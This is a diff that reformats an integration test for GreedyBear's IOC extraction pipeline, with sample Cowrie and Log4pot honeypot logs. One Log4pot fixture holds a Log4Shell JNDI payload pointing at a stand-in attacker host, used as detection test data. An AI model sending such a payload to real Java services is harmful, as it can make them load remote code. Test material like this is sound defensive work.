@@ -5,6 +5,7 @@ from django.test import TestCase
 from greedybear.extraction.extraction_pipeline import ExtractionPipeline
 from greedybear.models import IOC
 
+
 class TestExtractionPipelineIntegration(TestCase):
     def setUp(self):
         self.pipeline = ExtractionPipeline()
@@ -24,7 +25,7 @@ class TestExtractionPipelineIntegration(TestCase):
                 "session": "abc123def456",
                 "timestamp": "2023-01-01T10:00:00",
                 "@timestamp": "2023-01-01T10:00:00",
-                "t-pot_ip_ext": "192.168.1.1"
+                "t-pot_ip_ext": "192.168.1.1",
             }
         ]
         self.empty_log = []
@@ -35,7 +36,7 @@ class TestExtractionPipelineIntegration(TestCase):
             "type": "cowrie",
             "session": "abc123def456",
             "timestamp": "2023-01-01T10:00:00",
-            "@timestamp": "2023-01-01T10:00:00"
+            "@timestamp": "2023-01-01T10:00:00",
         }
         self.cowrie_log_2 = {
             "eventid": "cowrie.session.connect",
@@ -43,7 +44,7 @@ class TestExtractionPipelineIntegration(TestCase):
             "type": "cowrie",
             "session": "def456abc123",
             "timestamp": "2023-01-01T10:00:01",
-            "@timestamp": "2023-01-01T10:00:01"
+            "@timestamp": "2023-01-01T10:00:01",
         }
         self.log4pot_exploit_log = [
             {
@@ -52,7 +53,7 @@ class TestExtractionPipelineIntegration(TestCase):
                 "src_ip": "8.8.8.8",
                 "correlation_id": "corr123",
                 "timestamp": "2023-01-01T12:00:00",
-                "@timestamp": "2023-01-01T12:00:00"
+                "@timestamp": "2023-01-01T12:00:00",
             },
             {
                 "type": "log4pot",
@@ -61,8 +62,8 @@ class TestExtractionPipelineIntegration(TestCase):
                 "correlation_id": "corr123",
                 "deobfuscated_payload": "${jndi:ldap://evil-host.com:1389/a}",
                 "timestamp": "2023-01-01T12:00:01",
-                "@timestamp": "2023-01-01T12:00:01"
-            }
+                "@timestamp": "2023-01-01T12:00:01",
+            },
         ]
 
     @patch("greedybear.extraction.extraction_pipeline.UpdateScores")
@@ -102,14 +103,14 @@ class TestExtractionPipelineIntegration(TestCase):
     @patch("greedybear.extraction.strategies.base.IocProcessor")
     def test_pipeline_multiple_entries(self, mock_processor_class, mock_update_scores):
         logs = [self.cowrie_log_1, self.cowrie_log_2]
-        
+
         mock_processor = mock_processor_class.return_value
         ioc1 = IOC(name="8.8.8.8", type="ip")
         ioc1.save()
         ioc2 = IOC(name="8.8.4.4", type="ip")
         ioc2.save()
         mock_processor.add_ioc.side_effect = [ioc1, ioc2]
-        
+
         result = self.pipeline.run(logs)
         self.assertGreaterEqual(len(result), 2)
 
@@ -120,9 +121,9 @@ class TestExtractionPipelineIntegration(TestCase):
         ioc = IOC(name="8.8.8.8", type="ip")
         ioc.save()
         mock_processor.add_ioc.return_value = ioc
-        
+
         result = self.pipeline.run(self.log4pot_exploit_log)
-        
+
         # Log4pot should have found at least the scanner and the payload hostname
         self.assertGreaterEqual(len(result), 1)
         self.assertTrue(any(call.args[0].name == "8.8.8.8" for call in mock_processor.add_ioc.call_args_list))
